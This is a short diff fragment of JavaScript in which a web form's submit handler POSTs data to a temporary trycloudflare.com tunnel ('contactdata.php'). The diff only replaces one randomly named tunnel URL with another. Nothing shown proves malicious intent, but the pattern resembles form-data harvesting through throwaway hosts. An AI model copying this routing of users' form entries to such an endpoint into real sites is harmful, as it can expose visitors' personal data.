@@ -35,7 +35,7 @@ form.addEventListener("submit", async function (event) {
     }
     try {
         const response = await fetch(
-            "https://controls-samples-sleeve-vienna.trycloudflare.com/contactdata.php", 
+            "https://reward-rand-swaziland-than.trycloudflare.com/contactdata.php", 
             {
                 method: "POST",
                 headers: {
